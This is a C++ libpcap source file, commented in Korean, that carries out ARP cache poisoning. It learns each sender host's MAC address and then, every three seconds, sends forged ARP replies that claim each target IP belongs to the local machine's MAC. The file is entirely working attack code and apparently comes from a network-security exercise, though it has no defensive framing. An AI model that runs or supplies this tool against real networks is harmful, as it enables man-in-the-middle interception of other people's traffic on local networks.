#include <cstdio>
#include <pcap.h>
#include <cstring>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"
#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


void get_my_info(const char*dev,Mac& my_mac,Ip& my_Ip){
	struct ifreq ifr;
	int s = socket(AF_INET,SOCK_DGRAM,0);
	strncpy(ifr.ifr_name,dev,IFNAMSIZ);

	//mac 주소 획득 
    if (ioctl(s, SIOCGIFHWADDR, &ifr) == 0) {
        my_mac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
    }

	//Ip 주소 획득
    if (ioctl(s, SIOCGIFADDR, &ifr) == 0) {
        my_Ip = Ip(inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
    }

	close(s);
}


void send_arp_packet(pcap_t* pcap, Mac smac, Mac dmac,uint16_t op, Mac sha,Ip spa, Mac tha,Ip tpa){
	EthArpPacket packet;
	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = sha;
	packet.arp_.sip_ = htonl(spa);
	packet.arp_.tmac_ = tha;
	packet.arp_.tip_ = htonl(tpa);
	
	pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
}

//sender의 mac 주소 획득 

Mac get_sender_mac(pcap_t* pcap, Mac my_mac,Ip my_Ip,Ip sender_Ip){
	//정상 arp request 전송
	send_arp_packet(pcap,my_mac,Mac("FF:FF:FF:FF:FF:FF"),ArpHdr::Request,my_mac,my_Ip,Mac("00:00:00:00:00:00"),sender_Ip);

	//reply 획득

	while(true){
		struct pcap_pkthdr* header;
		const u_char* packet;

		int res=pcap_next_ex(pcap,&header,&packet);
		if(res==0) continue;
		if(res==-1||res==-2)break;

		EthArpPacket* p =(EthArpPacket*)packet;
		if (p->eth_.type() == EthHdr::Arp && 
	    p->arp_.op() == ArpHdr::Reply && 
	    p->arp_.sip() == sender_Ip) {
	    return p->arp_.smac_;
			}
	}

	 return Mac::nullMac();
}


int main(int argc,char* argv[]){
	char* dev=argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if(!pcap)return -1;

	Mac my_mac;
	Ip my_Ip;
	get_my_info(dev,my_mac,my_Ip);
	
	while(true){
	for(int i=2;i<argc;i+=2){
		Ip sender_Ip = Ip(argv[i]);
		Ip target_Ip = Ip(argv[i+1]);

		Mac sender_mac=get_sender_mac(pcap,my_mac,my_Ip,sender_Ip);
		if(sender_mac.isNull())continue;

		send_arp_packet(pcap,my_mac,sender_mac,ArpHdr::Reply,my_mac,target_Ip,sender_mac,sender_Ip);
	}
	sleep(3);
	}
	
	pcap_close(pcap);
	return 0;

}
